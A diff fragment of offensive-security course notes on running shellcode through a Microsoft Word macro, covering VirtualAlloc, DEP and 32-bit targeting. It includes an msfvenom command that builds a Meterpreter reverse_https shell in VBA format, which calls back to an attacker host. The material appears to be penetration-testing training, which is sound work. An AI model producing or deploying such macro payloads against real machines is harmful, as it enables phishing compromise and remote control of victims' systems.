@@ -10,7 +10,9 @@ We will use VirtualAlloc to allocate unmanaged memory that is writable, readable
 
 Allocating memory through other Win32 APIs returns non-executable memory due to the memory protection called Data Execution Prevention (DEP)
 
-In order to generate the shellcode, we need to know the target architecture. Obviously we are targeting a 64-bit Windows machine, but Microsoft Word 2016 installs as 32-bit by default, so we will generate 32-bit shellcode.
+In order to generate the shellcode, we need to know the target architecture. Obviously we are targeting a 64-bit Windows machine, but Microsoft Word 2016 installs as 32-bit by default, so we will generate 32-bit shellcode. 
+
+Also set sslversion TLS1.2 to handle https payload
 
     msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication 
   
